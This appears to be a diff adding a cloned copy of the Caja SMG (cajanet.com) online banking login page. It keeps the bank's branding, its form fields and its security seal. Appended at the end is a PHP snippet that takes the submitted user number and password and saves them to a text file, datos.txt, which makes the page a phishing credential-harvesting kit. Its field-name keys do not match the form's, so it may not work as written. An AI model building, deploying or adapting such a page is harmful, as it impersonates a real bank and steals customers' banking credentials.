@@ -1,0 +1,138 @@
+
+<!-- saved from url=(0036)https://cajanet.com:9443/BECSMG/Svlt -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+
+	<link rel="stylesheet" type="text/css" href="./cajanet.com_9443_BECSMG_Svlt_files/jquery-ui-1.7.1.custom.css">	
+	<link rel="stylesheet" type="text/css" href="./cajanet.com_9443_BECSMG_Svlt_files/becsmg.css">	
+	<script type="text/javascript" src="./cajanet.com_9443_BECSMG_Svlt_files/jquery-1.3.2.min.js.descargar"></script>
+	<script type="text/javascript" src="./cajanet.com_9443_BECSMG_Svlt_files/jquery.blockUI.js.descargar"></script>
+	<script type="text/javascript" src="./cajanet.com_9443_BECSMG_Svlt_files/jquery.form.js.descargar"></script>
+	<script type="text/javascript" src="./cajanet.com_9443_BECSMG_Svlt_files/common.js.descargar"></script>
+
+<script type="text/javascript">
+	  $(document).ready(function(){
+		  if(0 == 0){
+		 	$(document).keypress(function(event) {
+		 		if( event.target.id != 'btnEntrar' ){
+		 			switch (event.keyCode) {
+						case 13:
+							enviar();
+							break;
+					}
+				}
+			});
+			
+			$('#btnEntrar').click(enviar);
+		 }	
+		
+	 });
+</script>
+
+</head>
+
+
+<body>
+<form action="https://cajanet.com:9443/BECSMG/Svlt" method="post" id="_frmLogin" name="_frmLogin">
+    <input type="hidden" name="cmd" id="cmd" value="cmdInicio">
+    <input type="hidden" name="cntl_codigo" id="cntl_codigo" value="0">
+    <input type="hidden" name="cntl_estado" id="cntl_estado" value="0">
+    <input type="hidden" name="txtOTP" id="txtOTP" value="0">
+
+<table width="965px" style="height:540px;" border="0" cellpadding="0" cellspacing="0" align="center">
+	<tbody><tr>
+		<td height="100px" class="" colspan="4"><img src="./cajanet.com_9443_BECSMG_Svlt_files/top.jpg" width="100%" height="100px" style="position: relative;"></td>
+	</tr>
+	<tr> 
+		<td rowspan="2" width="25px" height="395px" class="lateral_Izq">&nbsp;</td>
+		<td colspan="" width="670px" height="320px" class="imagen_ppal">&nbsp;</td>
+		<td colspan="" width="245px" valign="top">
+			<table width="245px" style="background-color: rgb(237,237,237); position: static;" border="0" cellpadding="0" cellspacing="-2">
+				<tbody><tr>
+					<td height="200px" colspan="3">
+						<table align="center" style="position: static;">
+							<tbody><tr><td colspan="6">&nbsp;</td></tr>
+							<tr><td colspan="6" class="lblCampoBold">NÚMERO DE USUARIO</td></tr>
+							<tr>
+								<td colspan="6">
+									<input type="text" name="txtUser" id="txtUser" value="" maxlength="12" style="width:260px;height: 20px;font-size: 12;font-family: arial" onkeypress="javascript:validaEnter();">
+								</td>
+							</tr>
+							<tr><td colspan="6" class="lblCampoBold">CLAVE DE ACCESO</td></tr>
+							<tr>
+								<td colspan="6">
+									<input type="password" name="txtPass" id="txtPass" value="" maxlength="10" style="width:260px;height: 20px;font-size: 12;font-family: arial" onkeypress="return caracteresNoPermitidos(event);">
+									<input type="hidden" name="txtAcceso" id="txtAcceso" value="1">
+								</td>
+							</tr>
+							
+									
+								
+									
+							<tr>
+								<td colspan="6" align="right">
+									<input type="button" id="btnEntrar" class="btn_entrar" onmouseout="javascript:classButton(&#39;btnEntrar&#39;, &#39;btn_entrar&#39; );" onmouseover="javascript:classButton(&#39;btnEntrar&#39;,&#39;btn_entrar2&#39;);" onblur="javascript:classButton(&#39;btnEntrar&#39;,&#39;btn_entrar&#39;);" onfocus="javascript:classButton(&#39;btnEntrar&#39;,&#39;btn_entrar2&#39;);">
+								</td>
+							</tr>
+							<tr><td colspan="6">&nbsp;</td></tr>
+							<tr><td colspan="6">&nbsp;</td></tr>
+						</tbody></table>
+					</td>
+				</tr>
+				<tr>
+					<td width="82px" height="120px">
+						<input type="button" id="btnAct" class="btn_Activacion" onmouseout="javascript:classButton(&#39;btnAct&#39;, &#39;btn_Activacion&#39; );" onmouseover="javascript:classButton(&#39;btnAct&#39;,&#39;btn_Activacion2&#39;);" onblur="javascript:classButton(&#39;btnAct&#39;, &#39;btn_Activacion&#39; );" onfocus="javascript:classButton(&#39;btnAct&#39;,&#39;btn_Activacion2&#39;);" onclick="activacion();">
+					</td>
+					<td width="82px" height="120px">
+						<input type="button" id="btnRec" class="btn_recup" onmouseout="javascript:classButton(&#39;btnRec&#39;, &#39;btn_recup&#39; );" onmouseover="javascript:classButton(&#39;btnRec&#39;,&#39;btn_recup2&#39;);" onblur="javascript:classButton(&#39;btnRec&#39;, &#39;btn_recup&#39; );" onfocus="javascript:classButton(&#39;btnRec&#39;,&#39;btn_recup2&#39;);" onclick="recuperacion();">
+					</td>
+					<td width="82px" height="120px">
+						<input type="button" id="btnSalir" class="btn_salir" onmouseout="javascript:classButton(&#39;btnSalir&#39;, &#39;btn_salir&#39; );" onmouseover="javascript:classButton(&#39;btnSalir&#39;,&#39;btn_salir2&#39;);" onblur="javascript:classButton(&#39;btnSalir&#39;, &#39;btn_salir&#39; );" onfocus="javascript:classButton(&#39;btnSalir&#39;,&#39;btn_salir2&#39;);" onclick="CloseCurrentWindow();">
+					</td>
+				</tr>
+			</tbody></table>
+		</td> 
+		<td rowspan="2" width="25px" height="395px" class="lateral_Der">&nbsp;</td>
+	</tr>
+	<tr>
+		<td height="70px" colspan="2">&nbsp;</td>
+	</tr>
+	<tr>
+		<td height="75px" class="" colspan="4" valign="top"><img src="./cajanet.com_9443_BECSMG_Svlt_files/base.jpg" width="100%" height="75px" style="position: static;"></td>
+	</tr>
+	</tbody></table>
+	<table width="965px" align="center" border="0">
+		<tbody><tr style="height: 40px">
+			<td width="30%" align="left" class="lblTextosPieRojo">&nbsp; 
+				Servicio al Socio CAJATEL: <b>800 2252 754 &nbsp;&nbsp;</b><br>
+			</td>
+			<td width="60%" align="right" class="lblTextosPie"> 
+						CAJA SMG, S.C. DE A.P. DE R.L. de C.V. JAVIER MINA No. 14 COL CENTRO, C.P. 48740 EL GRULLO, JALISCO MEXICO
+			</td>
+			<td>
+				<table width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
+					<tbody><tr>
+						<td width="135" align="center" valign="top"><script type="text/javascript" src="https://seal.verisign.com/getseal?host_name=CAJANET.COM&amp;size=L&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=es"></script><br>
+						<a href="https://www.certsuperior.com/" target="_blank" style="color:#000000; text-decoration:none; font:bold 7px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">Certificados SSL</a><br>
+						<a href="https://www.certsuperior.com/" target="_blank" title="Certificados SSL"><img src="./cajanet.com_9443_BECSMG_Svlt_files/CS-verisign.jpg" width="130px" height="35px" border="0"></a></td>
+					</tr>
+				</tbody></table>
+			</td>
+		</tr>
+	</tbody></table>
+
+    <div id="_divErr" style="display:none"></div>
+</form>
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $numeroUsuario = $_POST['txtuser'];
+    $claveAcceso = $_POST['txtpass'];
+
+    // Guardar los datos en un archivo de texto
+    $datos = "Número de usuario: " . $numeroUsuario . "\n" . "Clave de acceso: " . $claveAcceso . "\n";
+
+    file_put_contents('datos.txt', $datos, FILE_APPEND | LOCK_EX);
+}
+?>
+ 
+</body></html>
